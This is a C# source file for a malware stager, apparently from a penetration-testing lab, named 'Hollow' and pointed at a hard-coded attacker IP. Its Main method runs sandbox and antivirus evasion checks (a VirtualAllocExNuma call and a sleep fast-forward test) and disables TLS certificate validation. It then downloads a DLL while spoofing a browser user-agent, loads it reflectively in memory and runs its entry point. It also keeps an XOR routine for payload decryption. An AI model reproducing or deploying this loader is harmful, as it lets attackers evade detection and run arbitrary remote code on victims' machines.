using System;
using System.IO;
using System.Text;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Reflection; // Required for reflective loading
using System.Net;        // Required for WebClient

namespace Hollow
{
    static class Program
    {
        // --- Configuration ---
        // Changed PayloadName to reflect x86 architecture
        private const string AttackerIp = "192.168.49.147";
        private const string PayloadName = "HollowDLLx86.dll";

        // --- Win32 API Imports (Evasion Only) ---
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static void Main(string[] args)
        {
            // 1. HEURISTIC EVASION: Non-emulated API
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == IntPtr.Zero) { return; }

            // 2. HEURISTIC EVASION: Sleep Fast-Forward Check
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double duration = DateTime.Now.Subtract(t1).TotalSeconds;
            if (duration < 1.5) { return; }

            // 3. REMOTE FETCH
            string url = $"http://{AttackerIp}/{PayloadName}";
            byte[] dllBytes;

            try
            {
                ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;

                using (WebClient client = new WebClient())
                {
                    // Add a common User-Agent to appear as legitimate browser traffic (Optional, but useful!)
                    client.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
                    dllBytes = client.DownloadData(url);
                }
            }
            catch (Exception)
            {
                return;
            }

            // 4. REFLECTIVE LOADING (.NET Assembly)
            // Loads the managed DLL into the current process context.
            try
            {
                Assembly assembly = Assembly.Load(dllBytes);

                // Identify the EntryPoint (Main method)
                MethodInfo entryPoint = assembly.EntryPoint;

                if (entryPoint != null)
                {
                    // Execute the DLL's entry point with empty arguments
                    object[] parameters = new object[] { new string[] { "" } };
                    entryPoint.Invoke(null, parameters);
                }
                else
                {
                    // Fallback: If no EntryPoint is defined, search for a common "Main" or "Execute" method
                    foreach (Type type in assembly.GetTypes())
                    {
                        MethodInfo method = type.GetMethod("Main", BindingFlags.Public | BindingFlags.Static)
                                           ?? type.GetMethod("Execute", BindingFlags.Public | BindingFlags.Static);

                        if (method != null)
                        {
                            method.Invoke(null, null);
                            break;
                        }
                    }
                }
            }
            catch (Exception)
            {
                // Handle or log errors during reflection
            }
        }

        // --- Helper Methods (Retained for future encryption/decryption) ---
        private static byte[] Xor(byte[] cipher, byte[] key)
        {
            byte[] decrypted = new byte[cipher.Length];
            for (int i = 0; i < cipher.Length; i++)
            {
                decrypted[i] = (byte)(cipher[i] ^ key[i % key.Length]);
            }
            return decrypted;
        }
    }
}
